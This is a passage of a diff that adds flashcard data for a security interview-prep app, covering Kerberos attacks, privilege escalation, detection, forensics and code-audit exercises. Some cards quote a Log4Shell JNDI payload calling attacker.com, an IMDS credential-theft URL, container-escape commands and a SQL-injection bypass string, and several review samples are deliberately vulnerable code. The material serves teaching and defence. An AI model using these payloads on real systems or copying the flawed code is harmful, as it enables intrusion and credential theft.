+         answer:"An MFA fatigue attack (also called MFA bombing) floods the victim with repeated push notification approval requests, hoping the user eventually taps 'Approve' out of frustration or confusion. Defence: require number matching (user must enter a code displayed on the login screen into the push notification) or use FIDO2 hardware keys which cannot be socially engineered.",
+         followUps:["What happened in the Uber breach (2022) related to MFA fatigue?"]},
+
+        {id:"a06",domain:"Authentication",depth:"deep",
+         question:"What is Kerberos in Active Directory and what is a Golden Ticket?",
+         hint:"KRBTGT hash = forge any TGT = persistent domain-wide access.",
+         answer:"Kerberos is the default AD authentication protocol. The Domain Controller issues Ticket Granting Tickets (TGTs) encrypted with the KRBTGT account's hash. A Golden Ticket is a forged TGT created by an attacker who has obtained the KRBTGT hash (typically via DCSync or domain admin access). It grants authentication as any user with any privileges and persists even after user password resets.",
+         followUps:["What is a Silver Ticket vs a Golden Ticket?","What is Kerberoasting?"]},
+
+        {id:"a07",domain:"Authentication",depth:"mid",
+         question:"What is Kerberoasting and why is it passive?",
+         hint:"Any domain user can request a TGS — and crack it offline.",
+         answer:"Any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN (Service Principal Name). The TGS is encrypted with the service account's NTLM hash. The attacker extracts the ticket and cracks the hash offline — no interaction with the target service or domain controller is needed after the ticket is obtained. Detection: anomalous TGS requests in Event ID 4769.",
+         followUps:["How do you defend against Kerberoasting?","What is DCSync?"]},
+
+        {id:"a08",domain:"Authentication",depth:"mid",
+         question:"What is Pass-the-Hash and what does it exploit?",
+         hint:"NTLM authentication accepts the hash itself as the credential.",
+         answer:"NTLM authentication uses a challenge-response protocol where the client proves knowledge of the password by computing HMAC(NTLM_hash, challenge). The hash is the credential — not the password. If an attacker obtains a user's NTLM hash (via Mimikatz, credential dumping) they can authenticate as that user without knowing the plaintext password.",
+         followUps:["How does Windows Defender Credential Guard prevent Pass-the-Hash?","What event IDs reveal Pass-the-Hash in Windows logs?"]}
+      ]
+    },
+    {
+      label: "OS & Privesc",
+      cards: [
+        {id:"o01",domain:"OS & Systems",depth:"mid",
+         question:"What is the first thing you check when looking for Linux privilege escalation?",
+         hint:"The quickest win before anything else.",
+         answer:"sudo -l — list what the current user can run as root without a password. Even restricted commands (find, vim, python, tar, less) can be abused to spawn a root shell via GTFOBins. This is the highest-probability quick win and takes under a second to check.",
+         followUps:["What is GTFOBins?","What do you check after sudo?"]},
+
+        {id:"o02",domain:"OS & Systems",depth:"mid",
+         question:"What is a SUID binary and why is it a privilege escalation target?",
+         hint:"The Set-UID bit causes it to run as the file's owner, not the executor.",
+         answer:"A SUID (Set User ID) binary runs with the privileges of the file's owner rather than the user executing it. If a binary is owned by root and has the SUID bit set, it executes as root regardless of who runs it. Non-standard SUID binaries (not part of a standard OS install) are high-value targets — check GTFOBins for known abuse techniques.",
+         followUps:["What command finds SUID binaries?","What is getcap and what does it find?"]},
+
+        {id:"o03",domain:"OS & Systems",depth:"mid",
+         question:"How can a root-owned cron job lead to privilege escalation?",
+         hint:"You need write access to what the cron job runs.",
+         answer:"If a cron job running as root executes a script that is world-writable, or sources a file from a world-writable directory, you can insert malicious commands that run as root at the next cron interval. Check crontab -l and /etc/cron* for scripts where the file or any sourced file is writable by your current user.",
+         followUps:["What tools automate the Linux privesc checklist? (LinPEAS)"]},
+
+        {id:"o04",domain:"OS & Systems",depth:"deep",
+         question:"What are stack canaries, NX/DEP, and ASLR and how is each defeated?",
+         hint:"These mitigations stack. Defeating all three requires chaining techniques.",
+         answer:"Stack canaries: random value between buffer and return address — overwriting it triggers a crash. Defeated by: info leak to read the canary value first.\n\nNX/DEP: stack is non-executable — shellcode on the stack can't run. Defeated by: ROP chains (reuse existing executable code).\n\nASLR: randomises addresses of stack, heap, libraries. Defeated by: info leak that reveals a memory address, allowing offset calculation.",
+         followUps:["What is a ROP chain?","What is PIE and how does it extend ASLR?"]},
+
+        {id:"o05",domain:"OS & Systems",depth:"mid",
+         question:"What is a ROP chain and why does it defeat NX/DEP?",
+         hint:"You don't need to inject new code if existing code does what you need.",
+         answer:"A ROP (Return-Oriented Programming) chain reuses small sequences of existing executable code called 'gadgets' — each ending in a ret instruction. By overwriting the return address to point to the first gadget, and chaining gadgets through the stack, the attacker builds arbitrary computation without injecting a single new byte into executable memory. NX/DEP only prevents executing injected code — it cannot block execution of code that was already there.",
+         followUps:["What tool helps find ROP gadgets? (ROPgadget, pwntools)","What is a ret2libc attack?"]},
+
+        {id:"o06",domain:"OS & Systems",depth:"mid",
+         question:"What is the Windows registry Run key and how do attackers use it for persistence?",
+         hint:"Values here execute every time a user logs in.",
+         answer:"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (per-user) and the HKLM equivalent (system-wide) contain values whose data is executed on every login. Attackers write the path to their malware here for persistence. Detection: monitor for new values via Autoruns (Sysinternals) or Windows Event ID 4657 (registry modification with auditing enabled).",
+         followUps:["Name four other Windows persistence locations.","What is DLL hijacking?"]}
+      ]
+    },
+    {
+      label: "Exploits & Attacks",
+      cards: [
+        {id:"e01",domain:"Exploits",depth:"mid",
+         question:"What are the three attack vectors for gaining initial access to a target?",
+         hint:"Social, Physical, Network.",
+         answer:"Social: phishing, spear phishing, vishing, pretexting, baiting (USB drops), tailgating — exploiting people rather than technology. Physical: direct hardware access, booting from external media, keyloggers, cold boot attacks. Network: exploiting public-facing services, CVEs in exposed software, interception attacks, port scanning to find attack surface.",
+         followUps:["What is water holing?","What is a supply chain attack?"]},
+
+        {id:"e02",domain:"Exploits",depth:"mid",
+         question:"What is the difference between a bind shell and a reverse shell? Which is used in practice and why?",
+         hint:"Firewalls block inbound connections — but not outbound.",
+         answer:"Bind shell: malware opens a port on the target and waits for the attacker to connect inbound. Reverse shell: malware on the target initiates an outbound connection to the attacker. In practice, reverse shells are almost always used because most corporate firewalls block inbound connections to arbitrary ports but allow outbound traffic on 80/443 — which a reverse shell uses to blend in.",
+         followUps:["What is a C2 (Command and Control) server?","How do you make a reverse shell more covert?"]},
+
+        {id:"e03",domain:"Attack Structure",depth:"deep",
+         question:"Name the stages of the cyber kill chain / attack lifecycle in order.",
+         hint:"Recon → Initial Access → Execution → Persistence → PrivEsc → Defense Evasion → Credential Access → Lateral Movement → Collection → Exfiltration → Impact.",
+         answer:"Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Command & Control → Impact. The MITRE ATT&CK framework maps specific TTPs to each stage with technique IDs.",
+         followUps:["At which stage is Pass-the-Hash used?","What is living off the land (LOLBins)?"]},
+
+        {id:"e04",domain:"Exploits",depth:"mid",
+         question:"What is living off the land (LOLBins) and why is it hard to detect?",
+         hint:"Signed Microsoft binaries being used for malicious purposes.",
+         answer:"Living off the land means using built-in, signed operating system tools (LOLBins — Living Off the Land Binaries) for malicious activity: PowerShell, WMI, certutil, regsvr32, mshta, bitsadmin. These binaries are trusted, signed by Microsoft, and their execution is normal in many environments. Signature-based detection won't flag them, and behavioral analysis must distinguish malicious from legitimate use of the same binary.",
+         followUps:["Name three LOLBins and one malicious use for each."]},
+
+        {id:"e05",domain:"Exploits",depth:"mid",
+         question:"What is a supply chain attack? Name a major example.",
+         hint:"Compromise the trusted update mechanism, not the target directly.",
+         answer:"A supply chain attack compromises a trusted vendor or software update mechanism to deliver malware to the vendor's customers — who trust and install the update. Sunburst/SolarWinds (2020): attackers compromised the SolarWinds Orion build process, inserting backdoor code into a digitally signed software update. ~18,000 organisations installed it, including US government agencies. Signed malware in a legitimate update bypassed virtually all defences.",
+         followUps:["What made Sunburst so hard to detect?","What is a dependency confusion attack?"]}
+      ]
+    },
+    {
+      label: "Threat Modelling",
+      cards: [
+        {id:"tm01",domain:"Threat Modelling",depth:"mid",
+         question:"What does STRIDE stand for and what security property does each element violate?",
+         hint:"Six threats, six violated properties.",
+         answer:"Spoofing → violates Authenticity. Tampering → violates Integrity. Repudiation → violates Accountability. Information Disclosure → violates Confidentiality. Denial of Service → violates Availability. Elevation of Privilege → violates Authorization.",
+         followUps:["How do you apply STRIDE in a threat modelling session?","What is DREAD and why was it deprecated?"]},
+
+        {id:"tm02",domain:"Threat Modelling",depth:"mid",
+         question:"What is a Data Flow Diagram (DFD) and why is it the starting point for threat modelling?",
+         hint:"You can't find threats you haven't drawn.",
+         answer:"A DFD shows how data moves through a system: external entities, processes, data stores, and the flows between them. Trust boundaries are drawn where data crosses privilege or trust levels (e.g. internet → DMZ → internal network). Threats are then identified at each component and crossing point. Without a DFD you miss attack surfaces — you can only find threats in what you've explicitly mapped.",
+         followUps:["What is a trust boundary in a DFD?","When in the SDLC should threat modelling happen?"]},
+
+        {id:"tm03",domain:"Threat Modelling",depth:"mid",
+         question:"What controls address each STRIDE category for a web API handling payments?",
+         hint:"One concrete control per letter.",
+         answer:"Spoofing → MFA, mutual TLS, JWT issuer/audience validation. Tampering → TLS in transit, HMAC on webhooks, DB integrity constraints. Repudiation → tamper-evident audit logs, correlation IDs. Information Disclosure → AES-256 at rest, field-level encryption for PAN, minimal error messages. Denial of Service → rate limiting, circuit breakers, WAF, auto-scaling. Elevation of Privilege → RBAC, horizontal access checks (verify ownership, not just auth).",
+         followUps:["What is DREAD and how does it score risk?","What is the principle of least privilege?"]}
+      ]
+    },
+    {
+      label: "Detection",
+      cards: [
+        {id:"d01",domain:"Detection",depth:"mid",
+         question:"What are the three things that create signals, triage signals, and alert humans in a detection stack?",
+         hint:"Signals → SIEM → analysts.",
+         answer:"Things that create signals: honeypots, Snort/Suricata IDS, host-based agents (OSSEC, EDR), firewall logs, DNS logs. Things that triage signals: SIEM (Splunk, QRadar, Elastic) — correlates and aggregates logs, applies rules. Things that alert humans: automated triage rules, machine learning anomaly detection, SOAR playbooks — the goal is reducing false positives to prevent analyst fatigue.",
+         followUps:["What is the difference between an IDS and an IPS?","What is analyst fatigue and how do you reduce it?"]},
+
+        {id:"d02",domain:"Detection",depth:"deep",
+         question:"A host is sending DNS queries with high-entropy 60-character subdomains every 45 seconds. What is this and how do you triage it?",
+         hint:"High entropy + periodic + long subdomains = exfiltration or DGA C2.",
+         answer:"Almost certainly DNS exfiltration or DGA-based C2 beaconing. Triage: (1) correlate DNS queries to process using Sysmon EventID 22, (2) hash the binary and check VirusTotal, (3) look up the queried domain in passive DNS and threat intel feeds, (4) check query frequency and length distribution against baselines, (5) scope to other hosts querying the same domain in the SIEM.",
+         followUps:["What is a DGA (Domain Generation Algorithm)?","What is Sysmon EventID 22?"]},
+
+        {id:"d03",domain:"Detection",depth:"mid",
+         question:"What are canary tokens and why do they have a near-zero false positive rate?",
+         hint:"Any access to them is suspicious by definition — they have no legitimate use.",
+         answer:"Canary tokens are honeytokens: fake credentials, documents, URLs, or DNS names designed to fire an alert the moment they're accessed. Because they have no legitimate business purpose, any access is definitionally suspicious. Examples: fake AWS keys in a config file, a Word document that phones home when opened, a URL buried in an internal wiki. False positives are nearly zero — unlike signature-based IDS which fires on legitimate traffic.",
+         followUps:["What is a honeypot vs a canary token?","What is a high-interaction vs low-interaction honeypot?"]},
+
+        {id:"d04",domain:"Detection",depth:"mid",
+         question:"What Windows Event IDs are most important for security monitoring?",
+         hint:"4624, 4625, 4648, 4688, 4698, 4769.",
+         answer:"4624: successful logon (check logon type — type 3=network, type 10=remote interactive). 4625: failed logon (brute force detection). 4648: logon with explicit credentials (RunAs, Pass-the-Hash indicator). 4688: process creation — enable command-line logging. 4698: scheduled task created. 4769: Kerberos service ticket request (anomalous requests → Kerberoasting). Sysmon extends this: EventID 1 (process + full cmdline), 3 (network connection), 10 (LSASS access), 22 (DNS query).",
+         followUps:["What is Sysmon and how does it extend native Windows logging?","What events indicate a Pass-the-Hash attack?"]}
+      ]
+    },
+    {
+      label: "Forensics & IR",
+      cards: [
+        {id:"f01",domain:"Forensics",depth:"mid",
+         question:"What is the order of volatility and why does it matter in incident response?",
+         hint:"Collect what disappears first: RAM → then disk.",
+         answer:"Order of volatility ranks evidence from most to least volatile (likely to be overwritten or lost): (1) CPU registers/cache, (2) running processes, network connections, open files, (3) RAM, (4) filesystem (swap, temp files), (5) disk image. You must collect in this order — RAM is lost on reboot, and a disk image can be taken anytime. Missing RAM often means losing malware that only ran in memory.",
+         followUps:["What tool is used for memory acquisition on Linux? (LiME)","What is memory-only malware?"]},
+
+        {id:"f02",domain:"Forensics",depth:"mid",
+         question:"What is chain of custody and why is it critical in digital forensics?",
+         hint:"Without it, evidence may be inadmissible in court.",
+         answer:"Chain of custody documents who had possession of evidence, when, and what was done with it. In digital forensics: hash the evidence immediately (MD5 + SHA-256), use a write-blocker when imaging, work only from copies — never the original. If chain of custody is broken, evidence may be inadmissible in legal proceedings and the integrity of the investigation is compromised.",
+         followUps:["What is a write-blocker and why is it used?","What is disk imaging with dd?"]},
+
+        {id:"f03",domain:"Forensics",depth:"mid",
+         question:"What is timestomping and how do you detect it?",
+         hint:"MACB timestamps don't all need to match — inconsistencies reveal tampering.",
+         answer:"Timestomping modifies a file's MACB timestamps (Modified, Accessed, Changed, Born/Created) to conceal when it was created or modified. Detection: compare NTFS $STANDARD_INFORMATION timestamps (visible to users) with $FILE_NAME timestamps (harder to modify, updated by NTFS internally) — legitimate files have consistent values; timestomped files often don't.",
+         followUps:["What forensic tools analyse NTFS MFT records?","What is anti-forensics?"]},
+
+        {id:"f04",domain:"Incident Management",depth:"mid",
+         question:"What is PICERL and what is the key decision during Containment?",
+         hint:"Contain now or watch to understand scope? Both have real costs.",
+         answer:"PICERL: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned. The key containment decision: isolate immediately (stops damage but may tip off the attacker and destroy evidence of their full scope) vs. monitor (maps the full attack but risks more damage and data loss). Use out-of-band communication (phone, Signal) if the attacker may be reading your email. Document everything.",
+         followUps:["What does GDPR require when a data breach is discovered?","When should you involve legal counsel in an incident?"]}
+      ]
+    },
+    {
+      label: "Malware",
+      cards: [
+        {id:"m01",domain:"Malware",depth:"mid",
+         question:"What is the difference between static and dynamic malware analysis?",
+         hint:"Static = examine without running. Dynamic = observe while running.",
+         answer:"Static analysis: examine the binary without executing it — compute hash, run strings, analyse PE imports (CreateRemoteThread → injection, WinInet → network), disassemble in IDA Pro or Ghidra. Safe but limited against packed/obfuscated malware.\n\nDynamic analysis: execute in a sandbox (Cuckoo, Any.Run) — observe file operations, registry changes, network connections, and API calls. More revealing but malware may detect the sandbox and change behaviour.",
+         followUps:["What is process hollowing?","Name three anti-sandbox techniques malware uses."]},
+
+        {id:"m02",domain:"Malware",depth:"mid",
+         question:"What was Stuxnet and why was it historically significant?",
+         hint:"The first publicly known cyberweapon targeting physical infrastructure.",
+         answer:"Stuxnet was a highly sophisticated worm discovered in 2010, attributed to the US and Israel. It targeted Iranian nuclear centrifuges by attacking Siemens PLCs controlling them — causing centrifuges to spin at destructive speeds while reporting normal operation to operators. It spread via USB, used four zero-day exploits, and was digitally signed with stolen certificates. The first known cyberweapon to cause physical destruction.",
+         followUps:["What was WannaCry?","What was Sunburst/SolarWinds?"]},
+
+        {id:"m03",domain:"Malware",depth:"mid",
+         question:"What is process hollowing and why do attackers use it?",
+         hint:"A legitimate process becomes a malware container.",
+         answer:"Process hollowing: attacker creates a legitimate process in suspended state (e.g. svchost.exe), unmaps its memory, writes malware code into the empty address space, then resumes execution. The malware now runs inside a legitimate process. Defenders see a trusted, signed process making network connections — the parent-child relationship looks normal and network activity appears to come from a system binary.",
+         followUps:["What is DLL injection?","How does EDR detect process hollowing?"]},
+
+        {id:"m04",domain:"Malware",depth:"mid",
+         question:"What is domain flux / fast flux and why does it make C2 resilient?",
+         hint:"Move the IP behind a domain constantly so takedown is ineffective.",
+         answer:"Domain flux (DGA) uses an algorithm seeded with the date/time to generate hundreds of domain names daily. The malware and C2 server independently calculate the same domain list — only the attacker needs to register one that works. Fast flux uses DNS TTLs of seconds with constantly rotating IPs (often compromised hosts) behind a single domain, making blacklisting ineffective since the IP changes before the block propagates.",
+         followUps:["How do defenders detect DGA traffic?","What is a DNS sinkhole used against DGA?"]}
+      ]
+    },
+    {
+      label: "Cloud & Infra",
+      cards: [
+        {id:"cl01",domain:"Cloud",depth:"deep",
+         question:"How does an attacker abuse the AWS instance metadata service (IMDS) to steal credentials?",
+         hint:"169.254.169.254 — reachable from any EC2 instance, no auth required on v1.",
+         answer:"On an EC2 instance with IMDSv1, any process (or SSRF payload) can GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the attached IAM role name, then GET that role's entry to receive AccessKeyId, SecretAccessKey, and a session Token — live credentials with the IAM role's permissions, valid for hours. IMDSv2 requires a PUT request first to get a session token, blocking simple GET-based SSRF.",
+         followUps:["What is the GCP equivalent of AWS IMDS?","How do you detect IMDS credential theft in CloudTrail logs?"]},
+
+        {id:"cl02",domain:"Cloud",depth:"mid",
+         question:"What is a privileged container escape and how does it work?",
+         hint:"--privileged gives the container nearly full host capabilities.",
+         answer:"A container run with --privileged has access to all Linux capabilities and host devices. An attacker can mount the host filesystem: fdisk -l to find the root disk, mount /dev/xvda1 /mnt, then chroot /mnt — giving a root shell on the underlying host. The Docker socket (-v /var/run/docker.sock) is an alternative: use the Docker API to spawn a new privileged container with the host filesystem mounted.",
+         followUps:["What Kubernetes RBAC permission is analogous to a Docker socket escape?","How does seccomp prevent container escapes?"]},
+
+        {id:"cl03",domain:"Cloud",depth:"mid",
+         question:"What is BeyondCorp / zero trust and how does it differ from traditional perimeter security?",
+         hint:"VPN is not in the model. Network location grants no trust.",
+         answer:"Traditional security trusts users on the corporate network. BeyondCorp (Google's zero trust model) eliminates network-based trust entirely — being on the corporate LAN grants no access. Access is granted based on device identity (certificate stored in TPM, verified by corporate CA) and user identity (SSO + MFA), regardless of network location. Every resource access is individually authenticated and authorised. Removes the VPN as a trust boundary.",
+         followUps:["What is microsegmentation?","What is a software-defined perimeter?"]},
+
+        {id:"cl04",domain:"Cloud",depth:"mid",
+         question:"What is Log4Shell (CVE-2021-44228) and why was it so severe?",
+         hint:"JNDI lookup in log data = remote code execution in the logging library.",
+         answer:"Log4Shell was a critical RCE vulnerability in Apache Log4j, a ubiquitous Java logging library. Log4j processed JNDI lookup expressions in logged strings: ${jndi:ldap://attacker.com/a}. Any application that logged user-controlled input (HTTP headers, usernames, form fields) was vulnerable. The attacker's LDAP server returned a malicious Java class that was loaded and executed. Severity: unauthenticated RCE, trivial to exploit, in virtually every Java application.",
+         followUps:["What is JNDI and why did Log4j process it in log messages?","How do you detect Log4Shell exploitation attempts in logs?"]}
+      ]
+    }
+  ],
+
+  Coding: [
+    {
+      label: "Log Parser",
+      cards: [
+        {id:"cd01",domain:"Coding",depth:"code",
+         question:"Write analyze_logs(filepath, target_ip) → dict.\n\nLog format: 'timestamp ip method path status'\n\nReturn: total_requests, unique_paths (list), status_code_counts (dict), suspicious (True if >100 requests in any 60-second window).\n\nRead line-by-line. Handle malformed lines.",
+         hint:"set() for unique paths. defaultdict(int) for counts. Sliding window (two pointers on sorted timestamps) for burst detection.",
+         answer:"Key decisions: set() for O(1) dedup → convert to list at end. defaultdict(int) avoids KeyError. strptime in try/except skips malformed lines. Line-by-line reads handle any file size. Sliding window: sort timestamps, move lo pointer forward when window ≥ 60s, flag if hi-lo+1 > 100.",
+         code:`from collections import defaultdict
+from datetime import datetime
+
+def analyze_logs(filepath: str, target_ip: str) -> dict:
+    result = {'total_requests':0,'unique_paths':[],
+              'status_code_counts':{},'suspicious':False}
+    paths, status_counts, timestamps = set(), defaultdict(int), []
+
+    with open(filepath,'r',encoding='utf-8',errors='replace') as f:
+        for line in f:
+            parts = line.strip().split()
+            if len(parts) < 5: continue
+            try:
+                ts = datetime.strptime(parts[0],'%Y-%m-%dT%H:%M:%S')
+            except ValueError:
+                continue
+            if parts[1] != target_ip: continue
+            result['total_requests'] += 1
+            paths.add(parts[3])
+            status_counts[parts[4]] += 1
+            timestamps.append(ts)
+
+    result['unique_paths'] = list(paths)
+    result['status_code_counts'] = dict(status_counts)
+
+    if timestamps:
+        timestamps.sort()
+        lo = 0
+        for hi in range(len(timestamps)):
+            while (timestamps[hi]-timestamps[lo]).total_seconds()>=60:
+                lo += 1
+            if hi - lo + 1 > 100:
+                result['suspicious'] = True
+                break
+    return result`}
+      ]
+    },
+    {
+      label: "Path Traversal",
+      cards: [
+        {id:"cd02",domain:"Coding",depth:"code",
+         question:"Write is_safe_path(base_dir: str, user_input: str) → bool.\n\nReturn True only if user_input resolves strictly inside base_dir.\n\nHandle: ../ sequences, symlinks, URL-encoded input (%2e%2e%2f), empty strings. Fail closed.",
+         hint:"os.path.realpath() resolves symlinks (abspath does not). Add os.sep to prevent /base matching /base_other. URL decode first.",
+         answer:"realpath() vs abspath(): realpath resolves symlinks — critical for symlink traversal attacks. os.sep suffix: prevents /srv_data being accepted as inside /srv. Fail closed: return False on any exception — never fail open in a security check.",
+         code:`import os
+from urllib.parse import unquote
+
+def is_safe_path(base_dir: str, user_input: str) -> bool:
+    if not user_input or not base_dir:
+        return False
+    try:
+        decoded = unquote(user_input)
+        base = os.path.realpath(base_dir)
+        target = os.path.realpath(os.path.join(base, decoded))
+        return target == base or target.startswith(base + os.sep)
+    except (ValueError, OSError):
+        return False  # fail closed
+
+assert is_safe_path('/srv','report.pdf') == True
+assert is_safe_path('/srv','../../etc/passwd') == False
+assert is_safe_path('/srv','%2e%2e%2fetc%2fpasswd') == False
+assert is_safe_path('/srv','') == False`}
+      ]
+    },
+    {
+      label: "Caesar Cipher",
+      cards: [
+        {id:"cd03",domain:"Coding",depth:"code",
+         question:"Implement caesar(text, shift, decode=False) → str.\n\nPreserve case. Leave non-alpha unchanged. Handle any shift value (negative, > 26, exactly 26). Write 4 assertions.",
+         hint:"(ord(char) - base + shift) % 26 + base. Python % always returns positive for positive modulus, so negative shifts work automatically.",
+         answer:"The key formula handles all shift values in one expression. base = 65 (uppercase) or 97 (lowercase). decode=True negates the shift. % 26 makes shift=26 identical to shift=0, shift=-1 identical to shift=25.",
+         code:`def caesar(text: str, shift: int, decode: bool = False) -> str:
+    if decode:
+        shift = -shift
+    result = []
+    for char in text:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            result.append(chr((ord(char) - base + shift) % 26 + base))
+        else:
+            result.append(char)
+    return ''.join(result)
+
+assert caesar('Hello!', 13) == 'Uryyb!'
+assert caesar('Uryyb!', 13, decode=True) == 'Hello!'
+assert caesar('xyz', 3) == 'abc'   # wrap-around
+assert caesar('abc', 26) == 'abc'  # full cycle = identity
+assert caesar('abc', -1) == 'zab'  # negative shift`}
+      ]
+    },
+    {
+      label: "Port Scanner",
+      cards: [
+        {id:"cd04",domain:"Coding",depth:"code",
+         question:"Write scan_host(host, ports, timeout=1.0, max_workers=100) → list.\n\nReturn sorted list of open port numbers. Use ThreadPoolExecutor. No nmap. Catch specific exceptions (not bare except). Explain why max_workers matters.",
+         hint:"socket.create_connection in a with block for auto-close. max_workers caps threads — 65535 uncapped threads exhausts OS limits.",
+         answer:"Context manager on socket ensures cleanup even on exception. Specific exceptions: catching bare except would swallow KeyboardInterrupt and SystemExit. max_workers=100 prevents resource exhaustion when scanning all 65535 ports. as_completed() collects results as threads finish. sorted() gives deterministic output.",
+         code:`import socket
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def scan_port(host: str, port: int, timeout: float) -> int | None:
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return port
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return None
+
+def scan_host(host: str, ports: list,
+              timeout: float = 1.0,
+              max_workers: int = 100) -> list:
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=max_workers) as ex:
+        futures = {ex.submit(scan_port,host,p,timeout): p for p in ports}
+        for f in as_completed(futures):
+            result = f.result()
+            if result is not None:
+                open_ports.append(result)
+    return sorted(open_ports)`}
+      ]
+    },
+    {
+      label: "Audit: Auth",
+      cards: [
+        {id:"cd05",domain:"Coding",depth:"code",
+         question:"AUDIT THIS CODE — 6 distinct issues.\n\nFor each: Line → Category → Attack chain → Fix.",
+         hint:"(1) Query building? (2) MD5 for passwords? (3) Python 3 type error? (4) Timing-safe comparison? (5) What is returned? (6) Resource lifecycle?",
+         answer:"1. Line 4 — SQL injection: string concat → username = \"' OR '1'='1\" bypasses auth. Fix: parameterized query with (username,) tuple.\n\n2. Line 7 — Wrong algorithm: MD5 is fast + no salt = GPU-crackable, rainbow tables. Fix: bcrypt.\n\n3. Line 7 — TypeError: md5(password) requires bytes in Python 3. Fix: password.encode().\n\n4. Line 8 — Timing attack: == short-circuits on first differing byte. Fix: hmac.compare_digest().\n\n5. Line 9 — Data exposure: returns full DB row including hash. Fix: return {'user_id': result[0]}.\n\n6. Line 1 — Resource leak: connection never closed. Fix: with sqlite3.connect() as conn:",
+         code:`import sqlite3, hashlib
+
+def login(username, password):
+    conn = sqlite3.connect("users.db")
+    query = "SELECT * FROM users WHERE username='" + username + "'"
+    result = conn.execute(query).fetchone()
+    if result:
+        stored_hash = result[2]
+        input_hash = hashlib.md5(password).hexdigest()
+        if stored_hash == input_hash:
+            return {"user": result, "auth": True}
+        return False
+    return False`}
+      ]
+    }
+  ],
+
+  Review: [
+    {
+      label: "JWT Middleware",
+      cards: [
+        {id:"rv01",domain:"Code Review",depth:"deep",
+         question:"REVIEW this JWT auth middleware running on every request across 40+ services.\n\nFind 6 issues. For each: Line → Category → Attack chain → Fix.",
+         hint:"(1) JWKS fetch timeout? (2) Caching? (3) Key format PyJWT expects? (4) Bare except impact? (5) Claims beyond signature/expiry? (6) JWKS_URL hardcoded?",
+         answer:"1. Lines 9-10 — No timeout → slow auth service = cascading DoS. Fix: timeout=2.\n\n2. Lines 9-10 — No caching → hammers auth service at scale. Fix: TTL cache, refresh on unknown kid.\n\n3. Line 23 — Wrong key format: PyJWT needs RSAPublicKey, not a raw dict. Fix: RSAAlgorithm.from_jwk(json.dumps(key)).\n\n4. Line 28 — Bare except masks real bugs as auth failures. Fix: except (jwt.InvalidTokenError, jwt.DecodeError).\n\n5. Line 30 — No iss/aud/required claim validation → cross-service token replay. Fix: validate issuer, audience, required claims.\n\n6. Line 5 — Hardcoded URL not configurable per env. Fix: os.environ['JWKS_URL'].",
+         code:`import jwt, requests
+from functools import wraps
+from flask import request, g
+
+JWKS_URL = "https://auth.internal/jwks"
+ALGORITHM = "RS256"
+
+def get_public_keys():
+    resp = requests.get(JWKS_URL)
+    return resp.json()["keys"]
+
+def authenticate(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization","").replace("Bearer ","")
+        if not token:
+            return {"error": "missing token"}, 401
+        keys = get_public_keys()
+        try:
+            header = jwt.get_unverified_header(token)
+            key = next(k for k in keys if k["kid"]==header["kid"])
+            payload = jwt.decode(token, key, algorithms=[ALGORITHM])
+        except StopIteration:
+            return {"error": "unknown key"}, 401
+        except jwt.ExpiredSignatureError:
+            return {"error": "expired"}, 401
+        except Exception:
+            return {"error": "invalid token"}, 401
+        g.user = payload
+        return f(*args, **kwargs)
+    return decorated`}
+      ]
+    },
+    {
+      label: "Secrets Manager",
+      cards: [
+        {id:"rv02",domain:"Code Review",depth:"deep",
+         question:"REVIEW this secrets manager client used by 15 services.\n\nFind 6 issues. For each: Line → Category → Attack chain → Fix.",
+         hint:"(1) Default VAULT_TOKEN value? (2) Protocol? (3) verify=False? (4) What gets logged? (5) Cache has TTL? (6) Static token vs scoped auth?",
+         answer:"1. Line 4 — Default 'root' token: misconfigured deployment gets Vault root access. Fix: os.environ['VAULT_TOKEN'], no default.\n\n2. Line 3 — HTTP: secrets transmitted in cleartext. Fix: HTTPS.\n\n3. Line 10 — verify=False: nullifies TLS, enables MITM. Fix: remove it.\n\n4. Line 12 — Logs secret_value: any log reader sees all secrets. Fix: log path only.\n\n5. _secret_cache — No TTL: revoked secrets served until restart. Fix: TTLCache with TTL matching lease duration.\n\n6. Static long-lived token: can't be scoped, high-value theft target. Fix: Vault Kubernetes auth for short-lived scoped tokens.",
+         code:`import requests, os, logging
+
+VAULT_URL = "http://vault.internal:8200"
+VAULT_TOKEN = os.environ.get("VAULT_TOKEN", "root")
+logger = logging.getLogger(__name__)
+_secret_cache = {}
+
+def get_secret(path: str) -> dict:
+    if path in _secret_cache:
+        return _secret_cache[path]
+    url = f"{VAULT_URL}/v1/{path}"
+    headers = {"X-Vault-Token": VAULT_TOKEN}
+    try:
+        resp = requests.get(url, headers=headers, verify=False)
+        data = resp.json()
+        secret_value = data["data"]["data"]
+        logger.info(f"Fetched secret {path}: {secret_value}")
+        _secret_cache[path] = secret_value
+        return secret_value
+    except Exception as e:
+        logger.error(f"Failed to fetch {path}: {e}")
+        raise`}
+      ]
+    },
+    {
+      label: "Password Reset",
+      cards: [
+        {id:"rv03",domain:"Code Review",depth:"deep",
+         question:"REVIEW this password reset token module.\n\nFind 7 issues. For each: Line → Category → Attack chain → Fix.",
+         hint:"(1) random.randint CSPRNG? (2) 6 digits entropy? (3) SHA-1? (4) Timing-safe? (5) In-memory storage? (6) Brute force protection? (7) Single-use?",
+         answer:"1. Line 5 — random.randint not CSPRNG: predictable from system time. Fix: secrets.token_hex(32).\n\n2. Line 5 — 900,000 values: brute-forceable with no rate limit. Fix: 32-byte token.\n\n3. Line 6 — SHA-1 deprecated: known collisions. Fix: sha256.\n\n4. Line 16 — == timing attack: short-circuits on first differing byte. Fix: hmac.compare_digest().\n\n5. RESET_TOKENS dict — Not production-viable: lost on restart, not shared. Fix: Redis with TTL.\n\n6. No brute force protection: unlimited guesses. Fix: track attempts, lock after 5.\n\n7. Token not deleted after use: reusable for full 1 hour. Fix: del RESET_TOKENS[user_id] on success.",
+         code:`import random, hashlib, time
+
+RESET_TOKENS = {}
+
+def generate_reset_token(user_id):
